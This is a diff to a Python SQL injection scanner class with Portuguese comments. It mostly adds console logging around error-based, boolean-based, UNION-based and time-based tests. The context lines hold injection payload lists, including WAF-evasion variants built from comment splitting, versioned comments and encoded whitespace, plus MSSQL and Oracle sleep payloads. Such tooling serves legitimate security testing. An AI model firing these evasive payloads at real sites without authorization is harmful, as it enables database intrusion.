@@ -1070,7 +1070,7 @@ class SQLiScanner:
         # Payloads estruturados por tipo para serem ativados por nível
         self.payloads = {
             "error_based": {
-                "basic": ["'", "\"", "')", "';", ";", "' AND 'x'='y"],
+                "basic": ["'", "\"", "')", ";'", ";", "' AND 'x'='y"],
                 "intermediate": ["' /*comment*/ AND /*comment*/ 'x'='y", "'%20AND%20'x'='y", "' %0aAND%0a 'x'='y"],
                 "advanced": ["' /*!50000AND*/ 'x'='y", "'+%0d%0a+AND+%0d%0a+'x'='y", "'/**/AND/**/'x'='y"]
             },
@@ -1100,7 +1100,7 @@ class SQLiScanner:
                 "mssql": {
                     "basic": "' WAITFOR DELAY '0:0:5'--",
                     "evasive": "' /*comment*/ WAITFOR /*comment*/ DELAY '0:0:5'--",
-                    "advanced": "';WAITFOR DELAY '0:0:5'--"
+                    "advanced": ";WAITFOR DELAY '0:0:5'--"
                 },
                 "oracle": {
                     "basic": "' AND DBMS_LOCK.SLEEP(5)--",
@@ -1148,6 +1148,7 @@ class SQLiScanner:
 
     def _add_finding(self, risk, v_type, detail, recommendation):
         """Adiciona uma nova descoberta, evitando duplicados."""
+        console.print(f"[bold red][VULNERABLE][/bold red] {v_type} detectada. Detalhes: {detail}")
         finding = {"Risco": risk, "Tipo": v_type, "Detalhe": detail, "Recomendação": recommendation}
         if finding not in self.vulnerable_points: 
             self.vulnerable_points.append(finding)
@@ -1267,11 +1268,13 @@ class SQLiScanner:
     
     def _test_union_based(self, url, param, original_value, method, form_data=None):
         """Testa injeção UNION-based SQL."""
+        console.print(f"  [cyan][INFO][/cyan] Testando UNION-based no parâmetro [bold]{param}[/bold]")
         # Primeiro, detecta o número de colunas
         columns_detected = 0
         
         for col_count in range(1, 10):  # Testa até 10 colunas
             payload = f"' UNION SELECT {','.join(['NULL'] * col_count)}--"
+            console.print(f"    [grey50]Tentando com {col_count} colunas...[/grey50]")
             test_value = (original_value or "") + payload
             data = {param: test_value} if method == 'get' else {**(form_data or {}), param: test_value}
             content, _ = self._get_page_content(url, method=method, data=data)
@@ -1285,6 +1288,7 @@ class SQLiScanner:
                         break
                 
                 if not error_found:
+                    console.print(f"  [green][SUCCESS][/green] Detectado {col_count} colunas.")
                     columns_detected = col_count
                     break
         
@@ -1297,6 +1301,7 @@ class SQLiScanner:
             ]
             
             for payload in extraction_payloads:
+                console.print(f"    [grey50]Tentando extrair dados com: {payload[:70]}[/grey50]")
                 test_value = (original_value or "") + payload
                 data = {param: test_value} if method == 'get' else {**(form_data or {}), param: test_value}
                 content, _ = self._get_page_content(url, method=method, data=data)
@@ -1314,6 +1319,7 @@ class SQLiScanner:
     def _test_param(self, url, param, original_value, method, form_data=None):
         """Testa um único parâmetro com base no nível de scan definido."""
         self.statistics['total_tests'] += 1
+        console.print(f"[cyan][INFO][/cyan] Testando o parâmetro [bold]{param}[/bold] em {url}")
         
         # Detecção inicial de WAF com payload simples
         test_response = None
@@ -1368,18 +1374,18 @@ class SQLiScanner:
         if use_evasive or self.waf_detected:
             payload_sets.extend(['intermediate', 'advanced'])
         
+        console.print(f"  [cyan][INFO][/cyan] Testando Error-Based (Nível 1)...")
         for payload_type in payload_sets:
             for payload in self.payloads["error_based"][payload_type]:
+                console.print(f"    [grey50]Payload: {payload}[/grey50]")
                 test_value = (original_value or "") + payload
                 data = {param: test_value} if method == 'get' else {**(form_data or {}), param: test_value}
                 content, _ = self._get_page_content(url, method=method, data=data)
                 
                 if content:
-                    # Se um DBMS específico for alvo, apenas verifica os seus padrões de erro
                     db_patterns = {self.dbms: self.error_patterns[self.dbms]} if self.dbms and self.dbms in self.error_patterns else self.error_patterns
                     for db, pattern in db_patterns.items():
                         if re.search(pattern, content, re.IGNORECASE):
-                            # Confirma a vulnerabilidade
                             if self._confirm_vulnerability(url, param, original_value, method, form_data, "error_based", payload):
                                 evasion_info = f" (Evasivo: {payload_type})" if payload_type != 'basic' else ""
                                 self._add_finding("Alto", "SQL Injection", 
@@ -1390,6 +1396,7 @@ class SQLiScanner:
 
     def _test_boolean_based(self, url, param, original_value, method, form_data=None):
         """Testa a injeção booleana cega."""
+        console.print(f"  [cyan][INFO][/cyan] Testando Boolean-Based (Nível 2)...")
         original_data = {param: original_value} if method == 'get' else form_data
         original_content, _ = self._get_page_content(url, method=method, data=original_data)
         if not original_content: return False
@@ -1400,12 +1407,14 @@ class SQLiScanner:
         
         for payload_type in payload_sets:
             for payload in self.payloads["boolean_based"]["true"][payload_type]:
+                console.print(f"    [grey50]Payload (True): {payload}[/grey50]")
                 test_value = (original_value or "") + payload
                 true_data = {param: test_value} if method == 'get' else {**(form_data or {}), param: test_value}
                 true_content, _ = self._get_page_content(url, method=method, data=true_data)
             
                 if true_content and SequenceMatcher(None, original_content, true_content).ratio() > 0.95:
                     for false_payload in self.payloads["boolean_based"]["false"][payload_type]:
+                        console.print(f"    [grey50]Payload (False): {false_payload}[/grey50]")
                         false_test_value = (original_value or "") + false_payload
                         false_data = {param: false_test_value} if method == 'get' else {**(form_data or {}), param: false_test_value}
                         false_content, _ = self._get_page_content(url, method=method, data=false_data)
@@ -1421,7 +1430,7 @@ class SQLiScanner:
 
     def _test_time_based(self, url, param, original_value, method, form_data=None):
         """Testa a injeção cega baseada em tempo com payloads evasivos."""
-        # Determina quais bancos testar
+        console.print(f"  [cyan][INFO][/cyan] Testando Time-Based (Nível 3)...")
         databases_to_test = {}
         if self.dbms and self.dbms in self.payloads["time_based"]:
             databases_to_test[self.dbms] = self.payloads["time_based"][self.dbms]
@@ -1430,20 +1439,21 @@ class SQLiScanner:
         else:
             databases_to_test = self.payloads["time_based"]
 
-        # Determina tipos de payload
         payload_types = ['basic']
         if self.waf_detected:
             payload_types.extend(['evasive', 'advanced'])
 
         for db, payload_dict in databases_to_test.items():
+            console.print(f"  [cyan][INFO][/cyan] Testando payloads para [bold]{db}[/bold]...")
             for payload_type in payload_types:
                 if payload_type in payload_dict:
                     payload_template = payload_dict[payload_type]
+                    console.print(f"    [grey50]Payload: {payload_template}[/grey50]")
                     test_value = (original_value or "") + payload_template
                     data = {param: test_value} if method == 'get' else {**(form_data or {}), param: test_value}
                     _, duration = self._get_page_content(url, method=method, data=data, timeout=10)
                     
-                    if duration > 4.5:  # Menor que o sleep para contar com a latência
+                    if duration > 4.5:
                         if self._confirm_vulnerability(url, param, original_value, method, form_data, "time_based", payload_template):
                             evasion_info = f" (Evasivo: {payload_type})" if payload_type != 'basic' else ""
                             self._add_finding("Alto", "SQL Injection", 
